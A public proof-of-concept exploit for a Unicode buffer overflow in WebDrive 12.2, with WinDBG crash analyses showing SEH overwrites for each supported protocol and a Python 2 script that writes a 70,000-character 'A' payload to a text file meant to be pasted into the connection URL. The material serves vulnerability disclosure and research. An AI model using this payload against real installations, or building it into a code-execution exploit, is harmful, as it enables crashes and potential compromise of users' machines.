#!/usr/bin/python
#Exploit Title:WebDrive Buffer OverFlow PoC
#Author: metacom
#Vendor Homepage: http://www.webdrive.com/products/webdrive/
#Software Link: https://www.webdrive.com/products/webdrive/download/
#Version: 12.2 (build # 4172) 32 bit
#Date found:     31.05.2015
#Date published: 31.05.2015
#Platform: Windows 7 Ultimate
#Bug: Multiple Buffer Overflow UNICODE
'''
----------------------------------------------------------------------------
Summary:
Unlike a typical FTP client, WebDrive allows you to open and 
edit server-based, files without the additional step of downloading the file. 
Using a simple wizard, you assign a network drive letter to the FTP Server. 
WebDrive supports additional protocols such as WebDAV, SFTP and Amazon S3 and 
maps a drive letter to each of these servers.You can map unique drive letters
to multiple servers.Download the full-function 20-day trial of WebDrive and 
make file management on remote servers easier and more efficient!
------------------------------------------------------------------------------
WebDrive connects to many types of web servers, 
as well as servers in the cloud.You can use WebDrive 
to access your files on all of the following server 
types and protocols:

WebDAV ------------>Vulnerable
WebDAV over SSL---->Vulnerable
FTP---------------->Vulnerable
FTP over SSL------->Vulnerable
Amazon S3---------->Vulnerable
SFTP--------------->Vulnerable
FrontPage Server--->Vulnerable

------------------------------------------------------------------------------
How to Crash:

Copy the AAAA...string from WebDrive.txt to clipboard, create a connection 
and paste it in the URL/Address and attempt to connect.


WebDAV
============================
Crash Analysis using WinDBG:
============================
(430.9f8): Access violation - code c0000005 (!!! second chance !!!)
eax=001cad5c ebx=02283af8 ecx=00000041 edx=02289d9c esi=fdf47264 edi=001cad5c
eip=0055ff2b esp=001c8cfc ebp=001c8d00 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
*** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\WebDrive\webdrive.exe
webdrive+0x30ff2b:
0055ff2b 66890c16        mov     word ptr [esi+edx],cx    ds:0023:001d1000=????
0:000> !exchain
001c8d20: webdrive+35a24e (005aa24e)
001cb768: webdrive+1c0041 (00410041)
Invalid exception stack at 00410041
0:000> d 001cb768
001cb768  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
001cb778  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
001cb788  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
001cb798  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
001cb7a8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
001cb7b8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
001cb7c8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
001cb7d8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.

WebDAV over SSL
============================
Crash Analysis using WinDBG:
============================
(b88.ca0): Access violation - code c0000005 (!!! second chance !!!)
eax=00000000 ebx=00000000 ecx=00410041 edx=775e660d esi=00000000 edi=00000000
eip=00410041 esp=000a1238 ebp=000a1258 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\system32\ipworks9.dll - 
ipworks9!IPWorks_SNPP_Get+0x57f:
00410041 038d4df0e8da    add     ecx,dword ptr [ebp-25170FB3h] ss:0023:daf302a5=????????
0:000>!exchain
Invalid exception stack at 00410041

FTP and FTP over SSL
============================
Crash Analysis using WinDBG:
============================
(834.70c): Access violation - code c0000005 (!!! second chance !!!)
eax=00000000 ebx=00410041 ecx=00000400 edx=00000000 esi=002d84f0 edi=00000000
eip=775e64f4 esp=002d8488 ebp=002d84dc iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
ntdll!KiFastSystemCallRet:
775e64f4 c3              ret
0:000> !exchain
002d8c1c: webdrive+35a24e (015da24e)
002db664: 00410041
Invalid exception stack at 00410041

Amazon S3
============================
Crash Analysis using WinDBG:
============================
(a64.a98): Access violation - code c0000005 (!!! second chance !!!)
eax=00000000 ebx=00410041 ecx=00000400 edx=00000000 esi=002f8550 edi=00000000
eip=775e64f4 esp=002f84e8 ebp=002f853c iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
ntdll!KiFastSystemCallRet:
775e64f4 c3              ret
0:000> !exchain
002f8c7c: webdrive+35a24e (015da24e)
002fb6c4: 00410041
Invalid exception stack at 00410041

SFTP
============================
Crash Analysis using WinDBG:
============================
(848.9a8): Access violation - code c0000005 (!!! second chance !!!)
eax=00000000 ebx=00410041 ecx=00000400 edx=00000000 esi=002380f8 edi=00000000
eip=775e64f4 esp=00238090 ebp=002380e4 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
ntdll!KiFastSystemCallRet:
775e64f4 c3              ret
0:000> !exchain
00238824: webdrive+35a24e (015da24e)
0023b26c: 00410041
Invalid exception stack at 00410041

FrontPage Server
============================
Crash Analysis using WinDBG:
============================
(cd4.710): Access violation - code c0000005 (!!! second chance !!!)
eax=007ba9f0 ebx=05d29738 ecx=00000041 edx=05d2fd48 esi=faa912b8 edi=007ba9f0
eip=003bff2b esp=007b8990 ebp=007b8994 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
*** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\WebDrive\webdrive.exe
webdrive+0x30ff2b:
003bff2b 66890c16        mov     word ptr [esi+edx],cx    ds:0023:007c1000=????
0:000> !exchain
007b89b4: webdrive+35a24e (0040a24e)
007bb3fc: webdrive+360041 (00410041)
Invalid exception stack at 00410041

'''

#Proof of Concept:

buffer="http://"
buffer+="\x41" * 70000
off=buffer

try:
	out_file = open("WebDrive.txt",'w')
	out_file.write(off)
	out_file.close()
	print("[*] Malicious txt file created successfully")
except:
	print "[!] Error creating file"